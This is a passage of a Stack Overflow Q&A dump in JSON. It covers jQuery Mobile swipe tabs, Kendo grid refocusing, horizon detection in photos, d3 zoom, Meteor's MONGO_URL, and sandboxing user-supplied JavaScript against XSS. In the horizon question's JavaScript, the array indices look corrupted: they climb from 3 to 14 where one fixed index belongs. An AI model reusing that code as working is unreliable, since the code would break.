                    "body": "<p>I'm easier than the others.. It's not the whole solution, but you can get my point.</p>\n\n<p>Option 1</p>\n\n<pre><code>   $(document).on(\"swipeleft\", '#page1', function () {\n        $('#fragment-2').trigger('click');\n                });\n</code></pre>\n\n<p>Option 2</p>\n\n<pre><code>   $(document).on(\"swipeleft\", '#page1', function () {\n        $(this).find(\"div [data-role=tabs]\").tabs( \"option\", \"active\", 1 );\n                });\n</code></pre>\n\n<p>Not sure about which one is better thought :)</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have tabs within a dynamic page. The tabs works great when pressed but I would like to add a swipe function to it so that users can also swipe to next tab.</p>\n\n<p>Here is my attempt of trying to make the swipe function work</p>\n\n<pre><code>function goToMatchDetailPage(matchHome, matchAway){\n    first_part_id = matchHome.substring(0,2);\n    sec_part_id = matchAway.substring(0,2);\n    var id = first_part_id.concat(sec_part_id);\n    //create the html template\n    var matchPage = $(\"&lt;div data-role='page' data-url=dummyUrl&gt;&lt;div data-role='header'&gt;&lt;h1&gt;\"\n      + matchHome + \"&lt;/h1&gt;&lt;/div&gt;&lt;div data-role='content'&gt;&lt;div data-role='tabs'&gt;\"\n  + \"&lt;div data-role='navbar'&gt;\"\n  +  \"&lt;ul&gt;\"\n  +    \"&lt;li&gt;&lt;a href='#fragment-1'&gt;\" + matchHome + \"&lt;/a&gt;&lt;/li&gt;\"\n  +   \"&lt;li&gt;&lt;a href='#fragment-2'&gt;\" + matchAway + \"&lt;/a&gt;&lt;/li&gt;\"\n  +  \"&lt;/ul&gt;\"\n  + \"&lt;/div&gt;\"\n  + \"&lt;div id='fragment-1'&gt;\"\n  +  \"&lt;p&gt;This is the content of the tab 'One', with the id fragment-1.&lt;/p&gt;\"\n  + \"&lt;/div&gt;\"\n  + \"&lt;div id='fragment-2'&gt;\"\n  +  \"&lt;p&gt;This is the content of the tab 'Two', with the id fragment-2.&lt;/p&gt;\"\n  + \"&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;\");\n\n    //append the new page to the page contanier\n    matchPage.appendTo($.mobile.pageContainer);\n\n    //go to the newly created page\n    $.mobile.changePage(matchPage);\n</code></pre>\n\n<p><strong>Here is the ppart that doesn't work</strong></p>\n\n<pre><code>$(function(){\n// Bind the swipeleftHandler callback function to the swipe event on div.box\n$( \"div\" ).on( \"swipeleft\", swipeleftHandler );\n\n// Callback function references the event target and adds the 'swipeleft' class to it\nfunction swipeleftHandler( event ){\n//go to the newly created page\n    $.mobile.changePage('#fragment-2');\n }\n});\n\n}\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/SUrN4.png\" alt=\"\n\"></p>\n",
            "last_activity_date": 1417385220,
            "question_id": 22848827,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "jquery-mobile",
                "swipe"
            ],
            "title": "Jquery mobile swipe"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>It's difficult to say exactly what is happening without seeing it in a demo, so if you can, I'd suggest creating one for illustration. I'm guessing that the call to <code>refresh</code> is removing the current cell selection and focusing the first cell because the grid is navigatable (I don't quite understand the rationale behind that behavior, but it's hard to say whether it's a bug since we don't get to read Telerik's code comments).</p>\n\n<p>One approach that might work would be to modify the <code>current</code> method to also store the current cell index:</p>\n\n<pre><code>kendo.ui.Grid.fn.refresh = (function(refresh) {\n    return function(e) {\n        this._refreshing = true;\n\n        refresh.call(this, e);\n\n        this._refreshing = false;\n    }\n})(kendo.ui.Grid.fn.refresh);\n\nkendo.ui.Grid.fn.current = (function(current) {\n    return function(element) {\n        // assuming element is td element, i.e. cell selection\n        if (!this._refreshing &amp;&amp; element) {\n            this._lastFocusedCellIndex = $(element).index(); // note this might break with grouping cells etc, see grid.cellIndex() method\n            this._lastFocusedUid = $(element).closest(\"tr\").data(\"uid\");\n        }\n\n        return current.call(this, element);\n    }\n})(kendo.ui.Grid.fn.current);\n\nkendo.ui.Grid.fn.refocusLastEditedCell = function () {\n    if (this._lastFocusedUid ) {\n        var row = $(this.tbody).find(\"tr[data-uid='\" + this._lastFocusedUid + \"']\");\n        var cell = $(row).children().eq(this._lastFocusedCellIndex);\n        this.editCell(cell);\n    }\n};\n</code></pre>\n\n<p>That way, you should always be able to use <code>grid.refocusLastEditedCell()</code> when you need to.</p>\n\n<p>Another idea:</p>\n\n<pre><code>save: function (e) {\n    var focusedCell = this.current();\n    var focusedCellIndex = focusedCell.index();    //gets the cell index of the currently focused cell\n\n    //...some dataItem saving (dataItem.set()) logic...\n\n    this.refresh();    //refreshing the grid instance\n\n    // reset current cell..\n    this.current(focusedCell);\n\n    setTimeout(function () {    //refocusing the cell\n        return function () {\n            var focusedCell = $(\"#grid tr[data-uid='\" + dataItem.uid + \"'] td:nth-child(\" + (focusedCellIndex + 1) + \")\");\n            $('#grid').data('kendoGrid').editCell(focusedCell);\n        }\n    }(), 200);\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>I don't have enough reputation to comment on the answer, but I'd like to thank you Lars Hoppner for your answer.  It helped me tremendously with the annoying refresh navigation problems of Kendo Grids.</p>\n\n<p>I also would like to add that for grids with horizontal scroll bars, your solution will still cause the scroll to shift as far left as possible while keeping the last edited cell in view.  To prevent this bad behavior, I did the following:</p>\n\n<pre><code>grid.closeCell();\ngrid.refresh();\ngrid.refocusLastEditedCell();\n</code></pre>\n\n<p>Closing the cell before refreshing kept the scroll bars in place, now everything works great.  Hopefully this helps anyone else viewing your answer.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I have a selectable, navigatable and editable grid. After I enter a value in a cell, I have to change the value in the cell under the updated cell. To show the updated values of both cells, I have to refresh the grid. When I do that, the edited cell loses focus. I found a way to refocus the last edited cell during the save event:</p>\n\n<pre><code>save: function (e) {\n    var focusedCellIndex = this.current()[0].cellIndex;    //gets the cell index of the currently focused cell\n\n    //...some dataItem saving (dataItem.set()) logic...\n\n    this.refresh();    //refreshing the grid instance\n\n    setTimeout(function () {    //refocusing the cell\n        return function () {\n            var focusedCell = $(\"#grid tr[data-uid='\" + dataItem.uid + \"'] td:nth-child(\" + (focusedCellIndex + 1) + \")\");\n            $('#grid').data('kendoGrid').editCell(focusedCell);\n        }\n    }(), 200);\n}\n</code></pre>\n\n<p>The problem is that this works for the first time, but if I try to re-edit the same cell again, the cell loses focus. When I try to debug, it seems that <code>this.current()[0].cellIndex</code> returns <strong>0</strong> in the second attempt, and because of that cell focusing isn't working anymore.</p>\n\n<p>Does anyone have any idea why <code>this.current()</code> works for the 1st time, and not for the 2nd time? Are there any other approaches for refocusing the cell?</p>\n",
            "last_activity_date": 1421503384,
            "question_id": 22709698,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "kendo-ui",
                "kendo-grid"
            ],
            "title": "Kendo grid cell refocusing after refresh"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I would do it like this:</p>\n\n<p>1.convert to BW</p>\n\n<p>2.scan Horizontal and Vertical lines from each side like this</p>\n\n<ul>\n<li>vertical lines scan from top</li>\n</ul>\n\n<p><img src=\"http://i.stack.imgur.com/O0Hx3.png\" alt=\"Vertical line scan\"></p>\n\n<ul>\n<li>the black line shows the line position</li>\n<li>for selected one the green arrows shows direction of scan (down)</li>\n<li>and direction of color intensity visualization (right)</li>\n<li><p>the white curve is color intensity graph (so you actually see what is happening)</p>\n\n<p>1.select some grid step this is 64 points between lines</p>\n\n<p>2.create temp array int p[]; to store line</p>\n\n<p>3.pre process each line</p>\n\n<ul>\n<li>p[0]=intensity of first pixel of line </li>\n<li>p[1,...] = derivation by x for H and by y for V lines (just substract neighbouring line pixels)</li>\n<li>blur p[1,...] few times to avoid noise problems (from both sides to avoid position shift)</li>\n</ul>\n\n<p>4.scan + integrate it back</p>\n\n<ul>\n<li>integration is just summing c(i)=p[ 0 ] + p[ 1 ] + ... + p[ i ]</li>\n<li>if c is below treshold you are outside atmosphere</li>\n<li>so start scanning and if from start of line is this area you are scanning from the right side</li>\n<li>remember where you reach treshold A-point</li>\n<li>continue scanning until you reach peak C-point (first negative derivation value or real peak ... local max value)</li>\n</ul>\n\n<p>5.compute B-point</p>\n\n<ul>\n<li>for ease you can do B = 0.5*(A+C)</li>\n<li>but if you want be precise then atmosphere intensity grows exponentially</li>\n<li>so scan derivations from A to C ... determine exponential function from it</li>\n<li>and if derivation start differs from it that is B-point</li>\n<li>remember all B points (for each line)</li>\n</ul></li>\n</ul>\n\n<p>3.now you have set of B-points</p>\n\n<ul>\n<li>delete all invalid B-points (you should have 2 per each line ... from start and from end)</li>\n<li>so area with bigger atmosphere is often the right one</li>\n<li><p>unless you have some dark seamless close object in view</p>\n\n<ol>\n<li>approximate some curve  through remaining B-points</li>\n</ol></li>\n</ul>\n\n<p>[Notes]</p>\n\n<ul>\n<li>you cannot shift B-point position based on altitude</li>\n<li>because the visual thickness of atmosphere also depends on</li>\n<li>observer and light source (Sun) positions</li>\n<li>Also you should filter remaining B-points because some stars in view could do a mess</li>\n<li>but the curve approximation should be enough</li>\n</ul>\n\n<p><strong>[Edit1] did some stuff around for fun</strong></p>\n\n<p>so I did it in BDS2006 C++ VCL ... so you have to change image access to your environment</p>\n\n<pre><code>void find_horizont()\n{\nint i,j,x,y,da,c0,c1,tr0,tr1;\n\npic1=pic0;      // copy input image pic0 to pic1\npic1.rgb2i();   // RGB -&gt; BW\n\nstruct _atm\n    {\n    int x,y;    // position of horizont point\n    int l;      // found atmosphere thickness\n    int id;     // 0,1 - V line; 2,3 - H line;\n    };\n_atm p,pnt[256];// horizont points\nint pnts=0;     // num of horizont points\nint n[4]={0,0,0,0}; // count of id-type points for the best option selection\n\nda=32;          // grid step [pixels]\ntr0=4;          // max difference of intensity inside vakuum homogenous area &lt;0,767&gt;\ntr1=10;         // min atmosphere thickness [pixels]\n\n// process V-lines\nfor (x=da&gt;&gt;1;x&lt;pic1.xs;x+=da)\n    {\n    // blur it y little (left p[0] alone)\n    for (i=0;i&lt;5;i++)\n        {\n        for (y=   0;y&lt;pic1.ys-1;y++) pic1.p[y][x].dd=(pic1.p[y][x].dd+pic1.p[y+1][x].dd)&gt;&gt;1;    // this shift left\n        for (y=pic1.ys-1;y&gt;   0;y--) pic1.p[y][x].dd=(pic1.p[y][x].dd+pic1.p[y-1][x].dd)&gt;&gt;1;    // this shift right\n        }\n    // scann from top to bottom\n    // - for end of homogenous area\n    for (c0=pic1.p[0][x].dd,y=0;y&lt;pic1.ys;y++)\n        {\n        c1=pic1.p[y][x].dd;\n        i=c1-c0; if (i&lt;0) i=-i;\n        if (i&gt;=tr0) break;  // non homogenous bump\n        }\n    p.l=y;\n    // - for end of exponential increasing intensity part\n    for (i=c1-c0,y++;y&lt;pic1.ys;y++)\n        {\n        c0=c1; c1=pic1.p[y][x].dd;\n        j = i; i =c1-c0;\n        if (i*j&lt;=0) break;  // peak\n        if (i+tr0&lt;j) break;     // non exponential ... increase is slowing down\n        }\n    // add horizont point if thick enough atmosphere found\n    p.id=0; p.x=x; p.y=y; p.l-=y; if (p.l&lt;0) p.l=-p.l; if (p.l&gt;tr1) { pnt[pnts]=p; pnts++; n[p.id]++; }\n    // scann from bottom to top\n    // - for end of homogenous area\n    for (c0=pic1.p[pic1.ys-1][x].dd,y=pic1.ys-1;y&gt;=0;y--)\n        {\n        c1=pic1.p[y][x].dd;\n        i=c1-c0; if (i&lt;0) i=-i;\n        if (i&gt;=tr0) break;  // non homogenous bump\n        }\n    p.l=y;\n    // - for end of exponential increasing intensity part\n    for (i=c1-c0,y--;y&gt;=0;y--)\n        {\n        c0=c1; c1=pic1.p[y][x].dd;\n        j = i; i =c1-c0;\n        if (i*j&lt;=0) break;  // peak\n        if (i+tr0&lt;j) break;     // non exponential ... increase is slowing down\n        }\n    // add horizont point\n    // add horizont point if thick enough atmosphere found\n    p.id=1; p.x=x; p.y=y; p.l-=y; if (p.l&lt;0) p.l=-p.l; if (p.l&gt;tr1) { pnt[pnts]=p; pnts++; n[p.id]++; }\n    }\n\n// process H-lines\nfor (y=da&gt;&gt;1;y&lt;pic1.ys;y+=da)\n    {\n    // blur it x little (left p[0] alone)\n    for (i=0;i&lt;5;i++)\n        {\n        for (x=   0;x&lt;pic1.xs-1;x++) pic1.p[y][x].dd=(pic1.p[y][x].dd+pic1.p[y][x+1].dd)&gt;&gt;1;    // this shift left\n        for (x=pic1.xs-1;x&gt;   0;x--) pic1.p[y][x].dd=(pic1.p[y][x].dd+pic1.p[y][x-1].dd)&gt;&gt;1;    // this shift right\n        }\n    // scann from top to bottom\n    // - for end of homogenous area\n    for (c0=pic1.p[y][0].dd,x=0;x&lt;pic1.xs;x++)\n        {\n        c1=pic1.p[y][x].dd;\n        i=c1-c0; if (i&lt;0) i=-i;\n        if (i&gt;=tr0) break;  // non homogenous bump\n        }\n    p.l=x;\n    // - for end of eyponential increasing intensitx part\n    for (i=c1-c0,x++;x&lt;pic1.xs;x++)\n        {\n        c0=c1; c1=pic1.p[y][x].dd;\n        j = i; i =c1-c0;\n        if (i*j&lt;=0) break;  // peak\n        if (i+tr0&lt;j) break;     // non eyponential ... increase is slowing down\n        }\n    // add horizont point if thick enough atmosphere found\n    p.id=2; p.y=y; p.x=x; p.l-=x; if (p.l&lt;0) p.l=-p.l; if (p.l&gt;tr1) { pnt[pnts]=p; pnts++; n[p.id]++; }\n    // scann from bottom to top\n    // - for end of homogenous area\n    for (c0=pic1.p[y][pic1.xs-1].dd,x=pic1.xs-1;x&gt;=0;x--)\n        {\n        c1=pic1.p[y][x].dd;\n        i=c1-c0; if (i&lt;0) i=-i;\n        if (i&gt;=tr0) break;  // non homogenous bump\n        }\n    p.l=x;\n    // - for end of eyponential increasing intensitx part\n    for (i=c1-c0,x--;x&gt;=0;x--)\n        {\n        c0=c1; c1=pic1.p[y][x].dd;\n        j = i; i =c1-c0;\n        if (i*j&lt;=0) break;  // peak\n        if (i+tr0&lt;j) break;     // non eyponential ... increase is slowing down\n        }\n    // add horizont point if thick enough atmosphere found\n    p.id=3; p.y=y; p.x=x; p.l-=x; if (p.l&lt;0) p.l=-p.l; if (p.l&gt;tr1) { pnt[pnts]=p; pnts++; n[p.id]++; }\n    }\n\npic1=pic0;  // get the original image\n\n// chose id with max horizont points\nj=0;\nif (n[j]&lt;n[1]) j=1;\nif (n[j]&lt;n[2]) j=2;\nif (n[j]&lt;n[3]) j=3;\n// draw horizont line from pnt.id==j points only\npic1.bmp-&gt;Canvas-&gt;Pen-&gt;Color=0x000000FF;    // Red\nfor (i=0;i&lt;pnts;i++) if (pnt[i].id==j) { pic1.bmp-&gt;Canvas-&gt;MoveTo(pnt[i].x,pnt[i].y); break; }\nfor (   ;i&lt;pnts;i++) if (pnt[i].id==j)   pic1.bmp-&gt;Canvas-&gt;LineTo(pnt[i].x,pnt[i].y);\n}\n</code></pre>\n\n<ul>\n<li>input image is pic0, output image is pic1</li>\n<li>they are my classes so some members are:</li>\n<li>xs,ys size of image in pixels</li>\n<li>p[y][x].dd is pixel at (x,y) position as 32 bit integer type</li>\n<li>bmp is GDI bitmap</li>\n<li><p>rgb2i() converts all RGB pixels to intensity integer values 0-768  (r+g+b)</p></li>\n<li><p>as you can see all horizont points are in pnt[pnts] array</p></li>\n<li>x,y is position of horizont point</li>\n<li>l is atmosphere thickness (exponential part)</li>\n<li>id is 0,1,2,3 which identify scan direction</li>\n</ul>\n\n<p>here is output image (works well even for rotated images)</p>\n\n<p><img src=\"http://i.stack.imgur.com/MMG5E.png\" alt=\"out normal\"></p>\n\n<ul>\n<li>this will not work for sun glow images</li>\n<li>unless you add some heavy duty filtering</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Consider some basic channel mixing and thresholding, followed by vertical samples as @Spektre suggests. [Edited to change to 2*R-B instead of R+G-B following @Spektre's comment]</p>\n\n<p>Here are some options on the channel mixing:</p>\n\n<p><img src=\"http://i.stack.imgur.com/uTcJe.png\" alt=\"multiplechoice\"></p>\n\n<ol>\n<li>Original</li>\n<li>Flat mono mix R+G+B</li>\n<li>Red channel</li>\n<li>2*R - B</li>\n<li>R + G - B</li>\n</ol>\n\n<p>It looks like #4 is the clearest horizon (thanks @Spektre for making me check this more carefully), mixing the colours in a ratio [Red 2: Green 0: Blue -1], you get this monochrome image:</p>\n\n<p><img src=\"http://i.stack.imgur.com/zSrFz.png\" alt=\"mixed channel mono\"></p>\n\n<p>Setting blue negative means that the blue haze over the horizon is used to kill off the fuzziness there. This turns out to be more effective than just using red and/or green (try it with the Channel Mixer in the GIMP).</p>\n\n<p>Then we can clarify further, if you like, by thresholding (although you could do this after sampling), here at 25% grey:</p>\n\n<p><img src=\"http://i.stack.imgur.com/4zLsr.png\" alt=\"25pc thresholded\"></p>\n\n<p>Using Spektre's approach of vertically sampling the image, just scan down until you see the value go over 25%. With 3 lines, you should gain 3 x,y pairs and thus reconstruct the curve knowing that it is a parabola.</p>\n\n<p>For more robustness, take more than 3 samples and discard outliers.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I am trying to detect the horizon in images taken from high altitude, so as to determine the orientation of the camera. I am also trying to have this run fast - ideally, I'd like to be able to process frames in real time (that is, a few frames per second) on a Raspberry Pi. The approach I've been taking so far is based on the fact that at high altitudes the sky is very dark, like so:</p>\n\n<p><img src=\"http://i.stack.imgur.com/G7KWs.jpg\" alt=\"Earth from space\"></p>\n\n<p>What I've tried is taking samples from all over the image and separating them into light and dark samples, and drawing a line between them. However, this places the horizon above its actual location, due to the fuzzyness of the amosphere:</p>\n\n<p>And here's my code (in Javascript for ease of web demo):</p>\n\n<pre><code>function mag(arr) {\n    return Math.sqrt(arr[0]*arr[0]+arr[1]*arr[1]+arr[2]*arr[2])\n}\n// return (a, b) that minimize\n// sum_i r_i * (a*x_i+b - y_i)^2\nfunction linear_regression( xy ) {\n    var i,\n        x, y,\n        sumx=0, sumy=0, sumx2=0, sumy2=0, sumxy=0, sumr=0,\n        a, b;\n    for(i=0;i&lt;xy.length;i++) {\n        x = xy[i][0]; y = xy[i][2];\n        r = 1\n        sumr += r;\n        sumx += r*x;\n        sumx2 += r*(x*x);\n        sumy += r*y;\n        sumy2 += r*(y*y);\n        sumxy += r*(x*y);\n    }\n    b = (sumy*sumx2 - sumx*sumxy)/(sumr*sumx2-sumx*sumx);\n    a = (sumr*sumxy - sumx*sumy)/(sumr*sumx2-sumx*sumx);\n    return [a, b];\n}\n\n\nvar vals = []\nfor (var i=0; i&lt;resolution; i++) {\n            vals.push([])\n            for (var j=0; j&lt;resolution; j++) {\n                    x = (canvas.width/(resolution+1))*(i+0.5)\n                    y = (canvas.height/(resolution+1))*(j+0.5)\n                    var pixelData = cr.getImageData(x, y, 1, 1).data;\n                    vals[vals.length-1].push([x,y,pixelData])\n                    cr.fillStyle=\"rgb(\"+pixelData[0]+\",\"+pixelData[1]+\",\"+pixelData[2]+\")\"\n                    cr.strokeStyle=\"rgb(255,255,255)\"\n                    cr.beginPath()\n                    cr.arc(x,y,10,0,2*Math.PI)\n                   cr.fill()\n                    cr.stroke()\n            }\n    }\n    var line1 = []\n    var line2 = []\n    for (var i in vals) {\n            i = parseInt(i)\n            for (var j in vals[i]) {\n                    j = parseInt(j)\n                    if (mag(vals[i][j][3])&lt;minmag) {\n                            if ((i&lt;(vals.length-2) ? mag(vals[i+1][j][4])&gt;minmag : false)\n                             || (i&gt;0 ? mag(vals[i-1][j][5])&gt;minmag : false)\n                             || (j&lt;(vals[i].length-2) ? mag(vals[i][j+1][6])&gt;minmag : false)\n                             || (j&gt;0 ? mag(vals[i][j-1][7])&gt;minmag : false)) {\n                                    cr.strokeStyle=\"rgb(255,0,0)\"\n                                    cr.beginPath()\n                                    cr.arc(vals[i][j][0],vals[i][j][8],10,0,2*Math.PI)\n                                    cr.stroke()\n                                    line1.push(vals[i][j])\n                            }\n                    }\n                    else if (mag(vals[i][j][9])&gt;minmag) {\n                            if ((i&lt;(vals.length-2) ? mag(vals[i+1][j][10])&lt;minmag : false)\n                             || (i&gt;0 ? mag(vals[i-1][j][11])&lt;minmag : false)\n                             || (j&lt;(vals[i].length-2) ? mag(vals[i][j+1][12])&lt;minmag : false)\n                             || (j&gt;0 ? mag(vals[i][j-1][13])&lt;minmag : false)) {\n                                    cr.strokeStyle=\"rgb(0,0,255)\"\n                                    cr.beginPath()\n                                    cr.arc(vals[i][j][0],vals[i][j][14],10,0,2*Math.PI)\n                                    cr.stroke()\n                                    line2.push(vals[i][j])\n                            }\n                    }\n            }\n        }\n        eq1 = linear_regression(line1)\n        cr.strokeStyle = \"rgb(255,0,0)\"\n        cr.beginPath()\n        cr.moveTo(0,eq1[1])\n        cr.lineTo(canvas.width,canvas.width*eq1[0]+eq1[1])\n        cr.stroke()\n        eq2 = linear_regression(line2)\n        cr.strokeStyle = \"rgb(0,0,255)\"\n        cr.beginPath()\n        cr.moveTo(0,eq2[1])\n        cr.lineTo(canvas.width,canvas.width*eq2[0]+eq2[1])\n        cr.stroke()\n        eq3 = [(eq1[0]+eq2[0])/2,(eq1[1]+eq2[1])/2]\n        cr.strokeStyle = \"rgb(0,255,0)\"\n        cr.beginPath()\n        cr.moveTo(0,eq3[1])\n        cr.lineTo(canvas.width,canvas.width*eq3[0]+eq3[1])\n        cr.stroke()\n</code></pre>\n\n<p>And the result (green line is the detected horizon, red and blue are estimated outside bounds):</p>\n\n<p><img src=\"http://i.stack.imgur.com/R64U3.jpg\" alt=\"enter image description here\"></p>\n\n<p>How can I improve this? And is there a more efficient way to do it? The final program will probably be written in Python, or C if that's too slow.</p>\n",
            "last_activity_date": 1423480857,
            "question_id": 22187205,
            "score": 3,
            "tags": [
                "javascript",
                "python",
                "c",
                "algorithm",
                "image-processing"
            ],
            "title": "How to find horizon line efficiently in a high-altitude photo?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>This is the way to do it:</p>\n\n<pre><code>function zoom() {\n  bars.attr(\"transform\", \"translate(\" + d3.event.translate[0]+\",0)scale(\" + d3.event.scale + \",1)\");\n\n  chart.select(\".x.axis\")\n    .attr(\"transform\", \"translate(\" + d3.event.translate[0]+\",\"+(height)+\")\")\n    .call(xAxis.scale(x.rangeRoundBands([0, width * d3.event.scale],.1 * d3.event.scale)));\n\n  chart.select(\".y.axis\")\n    .call(yAxis);\n}\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/0917vvqt/\" rel=\"nofollow\">http://jsfiddle.net/0917vvqt/</a></p>\n\n<p>Just translate and scale the bars in X not x and y, also translate the xAxis with the d3.event.translate[0] (x axis).</p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>I have a basic D3 bar chart with ordinal x-scale and linear y-scale.</p>\n\n<p>I've added zoom functionality and it works OK with the linear y-scale.</p>\n\n<p>How can I get the x- scale to adjust accordingly with the zoom level?</p>\n\n<p>Here's how it looks right now: <a href=\"http://jsfiddle.net/bM4HC/1/\" rel=\"nofollow\">http://jsfiddle.net/bM4HC/1/</a></p>\n\n<p>The js below doesn't work with ordinal scales:</p>\n\n<p><code>d3.behavior.zoom()\n    .x(x);</code></p>\n",
            "last_activity_date": 1425515283,
            "question_id": 22070367,
            "score": 3,
            "tags": [
                "javascript",
                "d3.js"
            ],
            "title": "d3.js: ordinal scale and zoom/pan"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>You are not able to use your own <code>MONGO_URL</code> with Meteor deploy hosting.</p>\n\n<p>Meteor deploy hosting takes care of the Email with Mailgun (if you use it), and provides mongodb for all apps deployed there.</p>\n\n<p>It is possible to change the <code>MAIL_URL</code>, but it is not possible to use a different mongodb.</p>\n\n<p>You can try, though im not sure it will work:</p>\n\n<p>Place this in your server side code somewhere</p>\n\n<pre><code>process.env.MONGO_URL = '..';\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Regarded to the Unoficial Meteor.js FAQ, thats not possible to do it easily, that might be tricky.</p>\n\n<p>So i signed up for a modulus Account, with MongoHQ Database.\nIt works right now.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>having a settings.json file is not enough you need to run with</p>\n\n<pre><code> meteor --settings settings.json \n</code></pre>\n\n<p>which is you cant do with meteor.com deploy. </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The application-configuration package (built in meteor package) contains the code to set mongo_url. See my answer here <a href=\"http://stackoverflow.com/a/23485319/2391620\">http://stackoverflow.com/a/23485319/2391620</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Create a <code>lib</code> folder under the <code>server</code> folder and write:</p>\n\n<pre><code>Meteor.settings = { //your settings };\n</code></pre>\n\n<p>According to documentation everything inside a folder named <code>lib</code> will be executed before anything, so this way we ensure that no code will be execute before this, preventing errors from accessing Metrics that don't exist.</p>\n\n<p>If you're already using the <code>lib</code> folder you've to named right to run before anything else that might conflict, check the docs about it.</p>\n\n<p>Enjoy.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I tried to export a settings.json as documented in the meteor.js documentation in order to connect my Meteor.js app with an external MongoHQ database :</p>\n\n<pre><code>{\n    \"env\": {\n        \"MONGO_URL\" : \"mongodb://xxx:xxxx@troup.mongohq.com:10037/xxx\"\n    }\n}\n</code></pre>\n\n<p>with the command : </p>\n\n<pre><code>mrt deploy myapp.meteor.com --settings settings.json\n</code></pre>\n\n<p>It doesn't even work, My app continue to connect the local database provided with the Meteor.app !\nMy MONGO_URL env variable didnt changed.</p>\n\n<p>Is there any solution to export my MONGO_URL env variable to connect an external MongoDB database ? </p>\n\n<p>I saw that is possible to change it while using heroku or modulus, what about the standard deploying meteor.com solution ? </p>\n",
            "last_activity_date": 1424311938,
            "question_id": 21971036,
            "score": 3,
            "tags": [
                "javascript",
                "node.js",
                "mongodb",
                "meteor"
            ],
            "title": "MongoDB / Meteor / Export MONGO_URL to deployed applications"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>One big issue is cross-site scripting where users add code that tells the browser to open and run code from other sites.  Say they add something that creates an iFrame or a hidden iFrame pointing to a site and starts downloading malicious code.</p>\n\n<p>There's no simple way around it (thanks to Bergi in the comments) to make sure no elements are created and no ajax calls are made.  </p>\n\n<p>I've been a member of sites that provided this functionality, but for those sites I paid for my own space so any vulnerabilities I add are inconveniencing my own clients, in that case it's a little more okay to let that slip by since it's not a security leak for everyone.</p>\n\n<p>One way around this is to create customizable controls for the users to use to add interactivity.  The plus is that you control the javascript being added, the minus is that your user base will have to request and then wait for you to create them.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Yes you could use <a href=\"http://msdn.microsoft.com/en-us/hh563496.aspx\" rel=\"nofollow\">HTML5 Sandbox</a> to only load user scripts in an IFrame.</p>\n\n<p>You should only host user content from a different domain than your main site. This will prevent any <a href=\"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\" rel=\"nofollow\">XSS</a> attack if an attacker convinces a user to visit the page directly (outside of the sandbox). e.g. if your site is <code>www.example.com</code> you could use the following code to display the sandboxed IFrame:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;iframe src=\"https://www.foo.com/show_user_script.aspx?id=123\" sandbox=\"allow-scripts\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>This will allow scripts, but forms and navigation outside of the IFrame will be prevented.</p>\n\n<p>The <a href=\"https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Sandboxed_frames\" rel=\"nofollow\">HTML5 Security Cheat Sheet guidance on OWASP</a> states this is the purpose of the sandbox:</p>\n\n<blockquote>\n  <p>Use the sandbox attribute of an iframe for untrusted content</p>\n</blockquote>\n\n<p>You should test whether sandbox is supported first, before rendering the IFrame:</p>\n\n<pre><code>&lt;iframe src=\"/blank.htm\" sandbox=\"allow-scripts\" id=\"foo\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<pre class=\"lang-js prettyprint-override\"><code>var sandboxSupported = \"sandbox\" in document.createElement(\"iframe\");\n\nif (sandboxSupported) {\n    document.getElementById('foo').setAttribute('src', 'https://www.foo.com/show_user_script.aspx?id=123');\n}\nelse\n{\n    // Not safe to display IFrame\n}\n</code></pre>\n\n<p>It is safer to do it this way by dynamically changing the <code>src</code> rather than redirecting away if <code>sandboxSupported</code> is <code>false</code> because then the iframe will not accidentally be rendered if the redirect doesn't happen in time.</p>\n\n<p>As <a href=\"http://stackoverflow.com/a/21218981/413180\">@Snowburnt</a> touches upon, there is nothing stopping a user script from redirecting a user to a site where a <a href=\"http://en.wikipedia.org/wiki/Drive-by_download\" rel=\"nofollow\">drive-by download</a> occurs, but this approach, assuming a user is up to date on patches, and there are no <a href=\"http://en.wikipedia.org/wiki/Zero-day_attack\" rel=\"nofollow\">zero day</a> vulnerabilities, this is a safe approach because it protects its end users and their data on your site via the <a href=\"http://en.wikipedia.org/wiki/Same-origin_policy\" rel=\"nofollow\">same origin policy</a>.</p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>I am planning to create an open source education web app where people can add and edit the content (a bit like Wikipedia).</p>\n\n<p>However I wish to add another feature that allows the user to add their own interactive content using JavaScript. (similar how JSFiddle does it)</p>\n\n<p>What are the security concerns in doing this?\nOptional question: How can these issues be overcome?</p>\n",
            "last_activity_date": 1421586525,
            "question_id": 21218857,
            "score": 3,
            "tags": [
                "javascript",
                "security"
            ],
            "title": "Security Issues for allowing users to add own JavaScript to your site?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
